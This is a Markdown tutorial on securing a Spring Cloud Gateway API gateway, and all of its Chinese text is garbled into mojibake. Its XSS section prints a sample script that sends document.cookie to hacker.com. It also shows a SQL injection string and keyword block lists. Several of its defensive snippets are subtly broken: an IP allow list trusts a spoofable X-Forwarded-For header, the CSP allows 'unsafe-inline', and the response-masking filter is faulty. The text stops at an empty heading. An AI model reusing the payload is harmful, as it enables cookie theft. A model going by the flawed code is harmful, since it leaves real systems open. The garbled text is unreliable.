---
title: 4ã€å®‰å…¨é˜²æŠ¤ç­–ç•¥
---
## ğŸ“š ç›®å½•

1. [å®‰å…¨é˜²æŠ¤æ¦‚è¿°](#1-å®‰å…¨é˜²æŠ¤æ¦‚è¿°)
2. [ç½‘ç»œå®‰å…¨é˜²æŠ¤](#2-ç½‘ç»œå®‰å…¨é˜²æŠ¤)
3. [åº”ç”¨å®‰å…¨é˜²æŠ¤](#3-åº”ç”¨å®‰å…¨é˜²æŠ¤)
4. [æ•°æ®å®‰å…¨ä¿æŠ¤](#4-æ•°æ®å®‰å…¨ä¿æŠ¤)
5. [è®¿é—®æ§åˆ¶ç­–ç•¥](#5-è®¿é—®æ§åˆ¶ç­–ç•¥)
6. [å®‰å…¨å®¡è®¡æ—¥å¿—](#6-å®‰å…¨å®¡è®¡æ—¥å¿—)
7. [å®‰å…¨äº‹ä»¶å“åº”](#7-å®‰å…¨äº‹ä»¶å“åº”)
8. [æ ¸å¿ƒè¦ç‚¹æ€»ç»“](#8-æ ¸å¿ƒè¦ç‚¹æ€»ç»“)

---

## 1. ğŸ›¡ï¸ å®‰å…¨é˜²æŠ¤æ¦‚è¿°


### 1.1 ä¸ºä»€ä¹ˆAPIç½‘å…³éœ€è¦å®‰å…¨é˜²æŠ¤


**ç”Ÿæ´»åŒ–ç†è§£**ï¼šAPIç½‘å…³å°±åƒæ˜¯å¤§æ¥¼çš„å‰å°å’Œä¿å®‰å®¤

```
ä¼ ç»Ÿå¤§æ¥¼è¿›å‡ºï¼š                APIç½‘å…³å®‰å…¨é˜²æŠ¤ï¼š
     è®¿å®¢                          å®¢æˆ·ç«¯è¯·æ±‚
      â†“                              â†“
   å‰å°ç™»è®°                        èº«ä»½éªŒè¯
      â†“                              â†“
   å®‰ä¿æ£€æŸ¥                        æƒé™æ£€æŸ¥
      â†“                              â†“
   å‘æ”¾é—¨ç¦å¡                      ç­¾å‘Token
      â†“                              â†“
   è¿›å…¥å¤§æ¥¼                        è®¿é—®æœåŠ¡
      â†“                              â†“
   ç›‘æ§è®°å½•                        å®‰å…¨å®¡è®¡
```

**æ ¸å¿ƒä½œç”¨**ï¼š
- **ç¬¬ä¸€é“é˜²çº¿**ï¼šé˜»æŒ¡æ¶æ„è¯·æ±‚ï¼Œä¿æŠ¤åç«¯æœåŠ¡
- **ç»Ÿä¸€ç®¡ç†**ï¼šé›†ä¸­å¤„ç†æ‰€æœ‰å®‰å…¨ç­–ç•¥ï¼Œé¿å…é‡å¤å»ºè®¾
- **ç›‘æ§é¢„è­¦**ï¼šå®æ—¶å‘ç°å¼‚å¸¸è¡Œä¸ºï¼Œå¿«é€Ÿå“åº”å®‰å…¨äº‹ä»¶

### 1.2 å®‰å…¨é˜²æŠ¤çš„ä¸‰ä¸ªå±‚æ¬¡


**ğŸ”° ç†è§£å±‚æ¬¡**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   ç¬¬ä¸€å±‚ï¼šç½‘ç»œå®‰å…¨ï¼ˆå¤–å›´é˜²æŠ¤ï¼‰    â”‚
â”‚   â€¢ é˜²ç«å¢™ã€DDoSé˜²æŠ¤             â”‚
â”‚   â€¢ IPé»‘ç™½åå•                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   ç¬¬äºŒå±‚ï¼šåº”ç”¨å®‰å…¨ï¼ˆæ ¸å¿ƒé˜²æŠ¤ï¼‰    â”‚
â”‚   â€¢ èº«ä»½è®¤è¯ã€æƒé™æ§åˆ¶           â”‚
â”‚   â€¢ é˜²SQLæ³¨å…¥ã€XSSæ”»å‡»           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   ç¬¬ä¸‰å±‚ï¼šæ•°æ®å®‰å…¨ï¼ˆæ·±åº¦é˜²æŠ¤ï¼‰    â”‚
â”‚   â€¢ æ•°æ®åŠ å¯†ã€è„±æ•               â”‚
â”‚   â€¢ ä¼ è¾“å®‰å…¨                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**ğŸ’¡ è®°å¿†è¦ç‚¹**
- ç½‘ç»œå®‰å…¨ï¼šæŒ¡åœ¨é—¨å¤–ï¼ˆé˜²æ­¢åäººè¿›æ¥ï¼‰
- åº”ç”¨å®‰å…¨ï¼šé—¨å†…æ£€æŸ¥ï¼ˆç¡®è®¤ä½ æ˜¯è°ã€èƒ½åšä»€ä¹ˆï¼‰
- æ•°æ®å®‰å…¨ï¼šä¿æŠ¤è´¢äº§ï¼ˆé‡è¦ä¿¡æ¯ä¸æ³„éœ²ï¼‰

---

## 2. ğŸŒ ç½‘ç»œå®‰å…¨é˜²æŠ¤


### 2.1 DDoSæ”»å‡»é˜²æŠ¤


**ä»€ä¹ˆæ˜¯DDoSæ”»å‡»**ï¼Ÿ

> **é€šä¿—ç†è§£**ï¼šå°±åƒé¤å…çªç„¶æ¥äº†ä¸€å¤§ç¾¤"å‡é¡¾å®¢"ï¼Œä»–ä»¬ä¸æ˜¯çœŸçš„æ¥åƒé¥­ï¼Œåªæ˜¯å ç€åº§ä½ï¼Œå¯¼è‡´çœŸæ­£çš„é¡¾å®¢è¿›ä¸æ¥ã€‚

**ğŸ¯ é˜²æŠ¤ç­–ç•¥**

| é˜²æŠ¤æ–¹å¼ | å·¥ä½œåŸç† | é€‚ç”¨åœºæ™¯ | æ•ˆæœ |
|---------|---------|---------|------|
| **æµé‡æ¸…æ´—** | è¯†åˆ«å¹¶è¿‡æ»¤å¼‚å¸¸æµé‡ | å¤§è§„æ¨¡æ”»å‡» | â­â­â­â­â­ |
| **é™æµç†”æ–­** | é™åˆ¶å•ä½æ—¶é—´è¯·æ±‚æ•° | çªå‘æµé‡ | â­â­â­â­ |
| **CDNåŠ é€Ÿ** | åˆ†æ•£æµé‡åˆ°å¤šä¸ªèŠ‚ç‚¹ | å…¨çƒç”¨æˆ· | â­â­â­â­ |
| **IPé»‘åå•** | ç›´æ¥æ‹’ç»æ¶æ„IP | å·²çŸ¥æ”»å‡»æº | â­â­â­ |

**å®é™…é…ç½®ç¤ºä¾‹**ï¼ˆä»¥Spring Cloud Gatewayä¸ºä¾‹ï¼‰

```yaml
spring:
  cloud:
    gateway:
      routes:
        - id: api-route
          uri: lb://backend-service
          filters:
            # é™æµé…ç½®ï¼šæ¯ç§’æœ€å¤š100ä¸ªè¯·æ±‚
            - name: RequestRateLimiter
              args:
                redis-rate-limiter.replenishRate: 100  # ä»¤ç‰Œæ¡¶æ¯ç§’æ”¾å…¥çš„ä»¤ç‰Œæ•°
                redis-rate-limiter.burstCapacity: 200  # ä»¤ç‰Œæ¡¶æœ€å¤§å®¹é‡
```

**ğŸ” åŸç†è§£é‡Š**
- `replenishRate`ï¼šå°±åƒæ°´é¾™å¤´æ¯ç§’æ»´100æ»´æ°´
- `burstCapacity`ï¼šæ°´æ¡¶æœ€å¤šè£…200æ»´æ°´
- å½“æ°´æ¡¶æ»¡äº†ï¼Œæ–°çš„è¯·æ±‚å°±ä¼šè¢«æ‹’ç»

### 2.2 IPé»‘ç™½åå•æœºåˆ¶


**å·¥ä½œæµç¨‹**

```
å®¢æˆ·ç«¯è¯·æ±‚
    â†“
æå–IPåœ°å€
    â†“
æ£€æŸ¥ç™½åå•ï¼ˆå…è®¸åˆ—è¡¨ï¼‰
    â†“
  æ˜¯ â†’ æ”¾è¡Œ
    â†“
  å¦ â†’ æ£€æŸ¥é»‘åå•ï¼ˆç¦æ­¢åˆ—è¡¨ï¼‰
           â†“
         æ˜¯ â†’ æ‹’ç»
           â†“
         å¦ â†’ ç»§ç»­å¤„ç†
```

**é…ç½®ç¤ºä¾‹**

```java
@Component
public class IpFilter implements GlobalFilter, Ordered {
    
    // ç™½åå•IPåˆ—è¡¨
    private static final Set<String> WHITE_LIST = Set.of(
        "192.168.1.100",  // å…¬å¸åŠå…¬ç½‘
        "10.0.0.0/8"      // å†…ç½‘IPæ®µ
    );
    
    // é»‘åå•IPåˆ—è¡¨
    private static final Set<String> BLACK_LIST = Set.of(
        "123.45.67.89",   // å·²çŸ¥æ¶æ„IP
        "98.76.54.32"
    );
    
    @Override
    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {
        String clientIp = getClientIp(exchange);
        
        // 1. æ£€æŸ¥ç™½åå•ï¼ˆä¼˜å…ˆçº§æœ€é«˜ï¼‰
        if (isInWhiteList(clientIp)) {
            return chain.filter(exchange);  // ç›´æ¥æ”¾è¡Œ
        }
        
        // 2. æ£€æŸ¥é»‘åå•
        if (isInBlackList(clientIp)) {
            exchange.getResponse().setStatusCode(HttpStatus.FORBIDDEN);
            return exchange.getResponse().setComplete();  // æ‹’ç»è®¿é—®
        }
        
        // 3. éƒ½ä¸åœ¨ï¼Œç»§ç»­åç»­å¤„ç†
        return chain.filter(exchange);
    }
    
    // è·å–çœŸå®å®¢æˆ·ç«¯IPï¼ˆè€ƒè™‘ä»£ç†æƒ…å†µï¼‰
    private String getClientIp(ServerWebExchange exchange) {
        HttpHeaders headers = exchange.getRequest().getHeaders();
        String ip = headers.getFirst("X-Forwarded-For");
        if (ip == null || ip.isEmpty()) {
            ip = exchange.getRequest().getRemoteAddress().getAddress().getHostAddress();
        }
        return ip;
    }
}
```

**âš ï¸ æ³¨æ„äº‹é¡¹**
- ç™½åå•ä¼˜å…ˆçº§é«˜äºé»‘åå•
- è¦è€ƒè™‘ä»£ç†ã€è´Ÿè½½å‡è¡¡å™¨çš„æƒ…å†µï¼ˆçœŸå®IPå¯èƒ½åœ¨`X-Forwarded-For`å¤´ä¸­ï¼‰
- å®šæœŸæ›´æ–°é»‘åå•ï¼Œç§»é™¤è¯¯åŠ çš„IP

---

## 3. ğŸ” åº”ç”¨å®‰å…¨é˜²æŠ¤


### 3.1 èº«ä»½è®¤è¯æœºåˆ¶


**å¸¸è§è®¤è¯æ–¹å¼å¯¹æ¯”**

| è®¤è¯æ–¹å¼ | åŸç† | ä¼˜ç‚¹ | ç¼ºç‚¹ | ä½¿ç”¨åœºæ™¯ |
|---------|------|------|------|---------|
| **Basicè®¤è¯** | ç”¨æˆ·åå¯†ç Base64ç¼–ç  | ç®€å• | ä¸å®‰å…¨ | âŒ ä¸æ¨è |
| **JWT Token** | æ— çŠ¶æ€ä»¤ç‰Œè®¤è¯ | å¯æ‰©å±•ã€æ— éœ€å­˜å‚¨ | Tokenæ³„éœ²é£é™© | âœ… å¾®æœåŠ¡é¦–é€‰ |
| **OAuth 2.0** | æˆæƒæ¡†æ¶ | æ ‡å‡†åŒ–ã€å®‰å…¨ | å¤æ‚åº¦é«˜ | âœ… ç¬¬ä¸‰æ–¹ç™»å½• |
| **API Key** | å›ºå®šå¯†é’¥ | ç®€å• | å¯†é’¥ç®¡ç†å›°éš¾ | âœ… å†…éƒ¨ç³»ç»Ÿ |

**ğŸ¯ JWTè®¤è¯æµç¨‹è¯¦è§£**

```
ç”¨æˆ·ç™»å½•æµç¨‹ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  å®¢æˆ·ç«¯  â”‚          â”‚ APIç½‘å…³ â”‚          â”‚è®¤è¯æœåŠ¡ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
     â”‚                     â”‚                     â”‚
     â”‚  1.å‘é€ç”¨æˆ·åå¯†ç     â”‚                     â”‚
     â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€> â”‚                     â”‚
     â”‚                     â”‚  2.è½¬å‘è®¤è¯è¯·æ±‚     â”‚
     â”‚                     â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€> â”‚
     â”‚                     â”‚                     â”‚
     â”‚                     â”‚  3.éªŒè¯æˆåŠŸ         â”‚
     â”‚                     â”‚  è¿”å›JWT Token      â”‚
     â”‚                     â”‚ <â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚
     â”‚  4.è¿”å›Token        â”‚                     â”‚
     â”‚ <â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚                     â”‚
     â”‚                     â”‚                     â”‚

åç»­è¯·æ±‚æµç¨‹ï¼š
     â”‚  5.æºå¸¦Tokenè®¿é—®API â”‚                     â”‚
     â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€> â”‚                     â”‚
     â”‚                     â”‚  6.éªŒè¯Token        â”‚
     â”‚                     â”‚ (æœ¬åœ°éªŒè¯ï¼Œæ— éœ€è¯·æ±‚) â”‚
     â”‚                     â”‚                     â”‚
     â”‚  7.è¿”å›æ•°æ®         â”‚                     â”‚
     â”‚ <â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚                     â”‚
```

**JWT TokenéªŒè¯ä»£ç **

```java
@Component
public class JwtAuthFilter implements GlobalFilter {
    
    @Autowired
    private JwtTokenUtil jwtTokenUtil;
    
    @Override
    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {
        // 1. ä»è¯·æ±‚å¤´è·å–Token
        String token = exchange.getRequest().getHeaders().getFirst("Authorization");
        
        if (token == null || !token.startsWith("Bearer ")) {
            return unauthorized(exchange);  // æ²¡æœ‰Tokenï¼Œè¿”å›401
        }
        
        // 2. å»æ‰"Bearer "å‰ç¼€
        token = token.substring(7);
        
        try {
            // 3. éªŒè¯Tokenæœ‰æ•ˆæ€§
            if (!jwtTokenUtil.validateToken(token)) {
                return unauthorized(exchange);
            }
            
            // 4. æå–ç”¨æˆ·ä¿¡æ¯ï¼Œæ”¾å…¥è¯·æ±‚å¤´ä¼ ç»™åç«¯
            String userId = jwtTokenUtil.getUserIdFromToken(token);
            ServerHttpRequest request = exchange.getRequest().mutate()
                .header("X-User-Id", userId)
                .build();
            
            // 5. ç»§ç»­å¤„ç†
            return chain.filter(exchange.mutate().request(request).build());
            
        } catch (Exception e) {
            return unauthorized(exchange);
        }
    }
    
    private Mono<Void> unauthorized(ServerWebExchange exchange) {
        exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED);
        return exchange.getResponse().setComplete();
    }
}
```

**ğŸ’¡ ç†è§£è¦ç‚¹**
- JWT Tokenåƒæ˜¯ä¸€å¼ "é€šè¡Œè¯"ï¼Œä¸Šé¢è®°å½•äº†ä½ çš„èº«ä»½ä¿¡æ¯
- ç½‘å…³åªéœ€è¦éªŒè¯è¿™ä¸ª"é€šè¡Œè¯"æ˜¯å¦æœ‰æ•ˆï¼Œä¸éœ€è¦æ¯æ¬¡éƒ½å»é—®è®¤è¯æœåŠ¡
- Tokenæœ‰è¿‡æœŸæ—¶é—´ï¼Œå°±åƒé—¨ç¦å¡ä¼šå¤±æ•ˆä¸€æ ·

### 3.2 é˜²SQLæ³¨å…¥æ”»å‡»


**ä»€ä¹ˆæ˜¯SQLæ³¨å…¥**ï¼Ÿ

> **å±é™©ç¤ºä¾‹**ï¼šç”¨æˆ·è¾“å…¥ `admin' OR '1'='1` ä½œä¸ºç”¨æˆ·å
> 
> åŸæœ¬çš„SQLï¼š`SELECT * FROM users WHERE username = 'admin' OR '1'='1'`
> 
> ç»“æœï¼š`'1'='1'` æ°¸è¿œæˆç«‹ï¼Œç»•è¿‡äº†å¯†ç éªŒè¯ï¼

**ğŸ›¡ï¸ é˜²æŠ¤æªæ–½**

**æ–¹æ³•ä¸€ï¼šå‚æ•°åŒ–æŸ¥è¯¢**ï¼ˆæœ€æœ‰æ•ˆï¼‰

```java
// âŒ å±é™©åšæ³•ï¼ˆç›´æ¥æ‹¼æ¥SQLï¼‰
String sql = "SELECT * FROM users WHERE username = '" + username + "'";

// âœ… å®‰å…¨åšæ³•ï¼ˆä½¿ç”¨å‚æ•°åŒ–ï¼‰
String sql = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setString(1, username);  // è‡ªåŠ¨è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦
```

**æ–¹æ³•äºŒï¼šè¾“å…¥éªŒè¯**

```java
@Component
public class SqlInjectionFilter implements GlobalFilter {
    
    // SQLæ³¨å…¥å…³é”®å­—é»‘åå•
    private static final String[] SQL_KEYWORDS = {
        "select", "insert", "update", "delete", "drop", 
        "union", "exec", "script", "or", "and", "--"
    };
    
    @Override
    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {
        // æ£€æŸ¥æ‰€æœ‰è¯·æ±‚å‚æ•°
        MultiValueMap<String, String> params = exchange.getRequest().getQueryParams();
        
        for (Map.Entry<String, List<String>> entry : params.entrySet()) {
            for (String value : entry.getValue()) {
                if (containsSqlKeyword(value.toLowerCase())) {
                    // å‘ç°SQLå…³é”®å­—ï¼Œæ‹’ç»è¯·æ±‚
                    return rejectRequest(exchange, "æ£€æµ‹åˆ°æ½œåœ¨çš„SQLæ³¨å…¥æ”»å‡»");
                }
            }
        }
        
        return chain.filter(exchange);
    }
    
    private boolean containsSqlKeyword(String input) {
        for (String keyword : SQL_KEYWORDS) {
            if (input.contains(keyword)) {
                return true;
            }
        }
        return false;
    }
}
```

### 3.3 é˜²XSSè·¨ç«™è„šæœ¬æ”»å‡»


**ä»€ä¹ˆæ˜¯XSSæ”»å‡»**ï¼Ÿ

> **é€šä¿—ç†è§£**ï¼šé»‘å®¢åœ¨ç½‘é¡µè¯„è®ºä¸­æ’å…¥æ¶æ„JavaScriptä»£ç ï¼Œå…¶ä»–ç”¨æˆ·çœ‹åˆ°è¯„è®ºæ—¶ï¼Œä»£ç å°±ä¼šæ‰§è¡Œï¼Œçªƒå–ä»–ä»¬çš„ä¿¡æ¯ã€‚

**æ”»å‡»ç¤ºä¾‹**

```html
<!-- ç”¨æˆ·è¾“å…¥çš„è¯„è®ºå†…å®¹ -->
<script>
  // çªƒå–ç”¨æˆ·Cookieå‘é€åˆ°é»‘å®¢æœåŠ¡å™¨
  fetch('http://hacker.com/steal?cookie=' + document.cookie);
</script>
```

**ğŸ›¡ï¸ é˜²æŠ¤ç­–ç•¥**

| é˜²æŠ¤æ–¹æ³• | å®ç°æ–¹å¼ | é˜²æŠ¤æ•ˆæœ |
|---------|---------|---------|
| **è¾“å‡ºè½¬ä¹‰** | å°†`<`è½¬æˆ`&lt;`ï¼Œ`>`è½¬æˆ`&gt;` | â­â­â­â­â­ |
| **CSPç­–ç•¥** | è®¾ç½®å†…å®¹å®‰å…¨ç­–ç•¥å¤´ | â­â­â­â­ |
| **HttpOnly Cookie** | Cookieè®¾ç½®HttpOnlyå±æ€§ | â­â­â­â­ |
| **è¾“å…¥è¿‡æ»¤** | è¿‡æ»¤HTMLæ ‡ç­¾ | â­â­â­ |

**é˜²XSSè¿‡æ»¤å™¨å®ç°**

```java
@Component
public class XssFilter implements GlobalFilter {
    
    @Override
    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {
        ServerHttpRequest request = exchange.getRequest();
        
        // 1. æ·»åŠ å®‰å…¨å“åº”å¤´
        ServerHttpResponse response = exchange.getResponse();
        response.getHeaders().add("X-Content-Type-Options", "nosniff");
        response.getHeaders().add("X-XSS-Protection", "1; mode=block");
        response.getHeaders().add("Content-Security-Policy", 
            "default-src 'self'; script-src 'self' 'unsafe-inline'");
        
        // 2. è¿‡æ»¤è¯·æ±‚å‚æ•°ä¸­çš„è„šæœ¬
        MultiValueMap<String, String> params = request.getQueryParams();
        boolean hasDangerousContent = params.values().stream()
            .flatMap(List::stream)
            .anyMatch(this::containsScriptTag);
        
        if (hasDangerousContent) {
            return rejectRequest(exchange, "æ£€æµ‹åˆ°æ½œåœ¨çš„XSSæ”»å‡»");
        }
        
        return chain.filter(exchange);
    }
    
    private boolean containsScriptTag(String input) {
        String lowerInput = input.toLowerCase();
        return lowerInput.contains("<script") || 
               lowerInput.contains("javascript:") ||
               lowerInput.contains("onerror=") ||
               lowerInput.contains("onclick=");
    }
}
```

**ğŸ’¡ å®‰å…¨å“åº”å¤´è¯´æ˜**
- `X-Content-Type-Options`: é˜²æ­¢æµè§ˆå™¨è¯¯åˆ¤æ–‡ä»¶ç±»å‹
- `X-XSS-Protection`: å¯ç”¨æµè§ˆå™¨çš„XSSè¿‡æ»¤å™¨
- `Content-Security-Policy`: é™åˆ¶é¡µé¢å¯ä»¥åŠ è½½çš„èµ„æºæ¥æº

---

## 4. ğŸ”’ æ•°æ®å®‰å…¨ä¿æŠ¤


### 4.1 æ•°æ®åŠ å¯†ä¼ è¾“


**HTTPSåŠ å¯†åŸç†**

```
HTTPä¼ è¾“ï¼ˆæ˜æ–‡ï¼Œä¸å®‰å…¨ï¼‰ï¼š
å®¢æˆ·ç«¯ â”€â”€[ç”¨æˆ·å:admin,å¯†ç :123456]â”€â”€> æœåŠ¡å™¨
        â†‘ 
    é»‘å®¢å¯ä»¥çœ‹åˆ°æ˜æ–‡å¯†ç ï¼

HTTPSä¼ è¾“ï¼ˆåŠ å¯†ï¼Œå®‰å…¨ï¼‰ï¼š
å®¢æˆ·ç«¯ â”€â”€[åŠ å¯†æ•°æ®:ajsd8f7asd...]â”€â”€> æœåŠ¡å™¨
        â†‘
    é»‘å®¢åªèƒ½çœ‹åˆ°ä¹±ç ï¼Œæ— æ³•è§£å¯†
```

**é…ç½®HTTPS**

```yaml
server:
  port: 8443
  ssl:
    enabled: true
    key-store: classpath:keystore.jks  # è¯ä¹¦æ–‡ä»¶
    key-store-password: your-password
    key-store-type: JKS
    key-alias: gateway
```

**ğŸ”‘ SSLè¯ä¹¦è·å–æ–¹å¼**
- **å…è´¹è¯ä¹¦**ï¼šLet's Encryptï¼ˆé€‚åˆå°é¡¹ç›®ï¼‰
- **å•†ä¸šè¯ä¹¦**ï¼šè´­ä¹°æƒå¨CAæœºæ„è¯ä¹¦ï¼ˆä¼ä¸šæ¨èï¼‰
- **è‡ªç­¾åè¯ä¹¦**ï¼šä»…ç”¨äºå¼€å‘æµ‹è¯•ç¯å¢ƒ

### 4.2 æ•æ„Ÿæ•°æ®è„±æ•


**ä»€ä¹ˆéœ€è¦è„±æ•**ï¼Ÿ

| æ•°æ®ç±»å‹ | åŸå§‹æ•°æ® | è„±æ•å | è„±æ•è§„åˆ™ |
|---------|---------|--------|---------|
| **æ‰‹æœºå·** | 13812345678 | 138****5678 | ä¸­é—´4ä½éšè— |
| **èº«ä»½è¯** | 330106199001011234 | 3301**********1234 | ä¸­é—´10ä½éšè— |
| **é“¶è¡Œå¡** | 6222021234567890123 | 622202***********123 | ä¸­é—´ä¿ç•™å‰6å3 |
| **é‚®ç®±** | user@example.com | u**r@example.com | ç”¨æˆ·åéƒ¨åˆ†éšè— |

**è„±æ•è¿‡æ»¤å™¨å®ç°**

```java
@Component
public class DataMaskFilter implements GlobalFilter {
    
    @Override
    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {
        return chain.filter(exchange).then(Mono.fromRunnable(() -> {
            // è·å–å“åº”ä½“
            ServerHttpResponse response = exchange.getResponse();
            DataBufferFactory bufferFactory = response.bufferFactory();
            
            // ä¿®æ”¹å“åº”ï¼Œè¿›è¡Œæ•°æ®è„±æ•
            response.writeWith(response.getBody().map(dataBuffer -> {
                byte[] content = new byte[dataBuffer.readableByteCount()];
                dataBuffer.read(content);
                DataBufferUtils.release(dataBuffer);
                
                String body = new String(content, StandardCharsets.UTF_8);
                // è„±æ•å¤„ç†
                String maskedBody = maskSensitiveData(body);
                
                return bufferFactory.wrap(maskedBody.getBytes());
            }));
        }));
    }
    
    private String maskSensitiveData(String json) {
        try {
            JSONObject jsonObject = JSON.parseObject(json);
            
            // æ‰‹æœºå·è„±æ•
            if (jsonObject.containsKey("phone")) {
                String phone = jsonObject.getString("phone");
                jsonObject.put("phone", maskPhone(phone));
            }
            
            // èº«ä»½è¯è„±æ•
            if (jsonObject.containsKey("idCard")) {
                String idCard = jsonObject.getString("idCard");
                jsonObject.put("idCard", maskIdCard(idCard));
            }
            
            return jsonObject.toJSONString();
        } catch (Exception e) {
            return json;  // è§£æå¤±è´¥ï¼Œè¿”å›åŸæ•°æ®
        }
    }
    
    private String maskPhone(String phone) {
        if (phone == null || phone.length() != 11) return phone;
        return phone.substring(0, 3) + "****" + phone.substring(7);
    }
    
    private String maskIdCard(String idCard) {
        if (idCard == null || idCard.length() != 18) return idCard;
        return idCard.substring(0, 4) + "**********" + idCard.substring(14);
    }
}
```

---

## 5. ğŸ‘® è®¿é—®æ§åˆ¶ç­–ç•¥


### 5.1 RBACæƒé™æ¨¡å‹


**ä»€ä¹ˆæ˜¯RBAC**ï¼Ÿ

> **Role-Based Access Control**ï¼ˆåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼‰
> 
> **ç”Ÿæ´»ç±»æ¯”**ï¼šå°±åƒå…¬å¸é‡Œä¸åŒå²—ä½æœ‰ä¸åŒæƒé™
> - æ™®é€šå‘˜å·¥ï¼šåªèƒ½çœ‹è‡ªå·±çš„å·¥èµ„
> - éƒ¨é—¨ç»ç†ï¼šèƒ½çœ‹æœ¬éƒ¨é—¨æ‰€æœ‰äººçš„å·¥èµ„
> - è´¢åŠ¡æ€»ç›‘ï¼šèƒ½çœ‹å…¨å…¬å¸çš„å·¥èµ„

**æƒé™æ¨¡å‹ç»“æ„**

```
ç”¨æˆ·(User) â†’ è§’è‰²(Role) â†’ æƒé™(Permission) â†’ èµ„æº(Resource)

ç¤ºä¾‹ï¼š
å¼ ä¸‰ â†’ è®¢å•ç®¡ç†å‘˜ â†’ æŸ¥çœ‹è®¢å•ã€ä¿®æ”¹è®¢å• â†’ /api/orders/*
æå›› â†’ æ™®é€šç”¨æˆ·   â†’ æŸ¥çœ‹è®¢å•         â†’ /api/orders/my
```

**æƒé™é…ç½®ç¤ºä¾‹**

```yaml
# æƒé™é…ç½®æ–‡ä»¶
permissions:
  roles:
    - name: ADMIN
      permissions:
        - GET:/api/**
        - POST:/api/**
        - PUT:/api/**
        - DELETE:/api/**
    
    - name: USER
      permissions:
        - GET:/api/orders/my
        - POST:/api/orders
    
    - name: GUEST
      permissions:
        - GET:/api/products
```

**æƒé™éªŒè¯å®ç°**

```java
@Component
public class RbacFilter implements GlobalFilter {
    
    @Autowired
    private PermissionService permissionService;
    
    @Override
    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {
        ServerHttpRequest request = exchange.getRequest();
        
        // 1. ä»Tokenä¸­æå–ç”¨æˆ·è§’è‰²
        String token = request.getHeaders().getFirst("Authorization");
        Set<String> userRoles = extractRolesFromToken(token);
        
        // 2. è·å–è¯·æ±‚çš„èµ„æºè·¯å¾„
        String method = request.getMethodValue();
        String path = request.getURI().getPath();
        String resource = method + ":" + path;  // ä¾‹å¦‚ï¼šGET:/api/orders
        
        // 3. æ£€æŸ¥ç”¨æˆ·è§’è‰²æ˜¯å¦æœ‰æƒé™è®¿é—®è¯¥èµ„æº
        boolean hasPermission = userRoles.stream()
            .anyMatch(role -> permissionService.checkPermission(role, resource));
        
        if (!hasPermission) {
            // æ²¡æœ‰æƒé™ï¼Œè¿”å›403
            exchange.getResponse().setStatusCode(HttpStatus.FORBIDDEN);
            return exchange.getResponse().setComplete();
        }
        
        return chain.filter(exchange);
    }
}
```

**ğŸ’¡ ç†è§£è¦ç‚¹**
- ç”¨æˆ·â†’è§’è‰²â†’æƒé™ï¼Œæ˜¯ä¸‰å±‚å…³ç³»
- ä¿®æ”¹è§’è‰²æƒé™æ—¶ï¼Œè¯¥è§’è‰²ä¸‹çš„æ‰€æœ‰ç”¨æˆ·æƒé™éƒ½ä¼šå˜åŒ–
- ä¸€ä¸ªç”¨æˆ·å¯ä»¥æ‹¥æœ‰å¤šä¸ªè§’è‰²

### 5.2 æ¥å£çº§åˆ«çš„æƒé™æ§åˆ¶


**ç»†ç²’åº¦æƒé™æ§åˆ¶**

```java
@RestController
@RequestMapping("/api/orders")
public class OrderController {
    
    // ä»»ä½•äººéƒ½å¯ä»¥æŸ¥çœ‹è®¢å•åˆ—è¡¨
    @GetMapping
    @RequirePermission("order:list")
    public List<Order> listOrders() {
        return orderService.findAll();
    }
    
    // åªæœ‰ç®¡ç†å‘˜å¯ä»¥åˆ é™¤è®¢å•
    @DeleteMapping("/{id}")
    @RequirePermission("order:delete")
    public void deleteOrder(@PathVariable Long id) {
        orderService.delete(id);
    }
    
    // ç”¨æˆ·åªèƒ½æŸ¥çœ‹è‡ªå·±çš„è®¢å•è¯¦æƒ…
    @GetMapping("/{id}")
    @RequirePermission("order:view")
    @DataFilter  // æ•°æ®æƒé™è¿‡æ»¤
    public Order getOrder(@PathVariable Long id) {
        return orderService.findById(id);
    }
}
```

---

## 6. ğŸ“ å®‰å…¨å®¡è®¡æ—¥å¿—


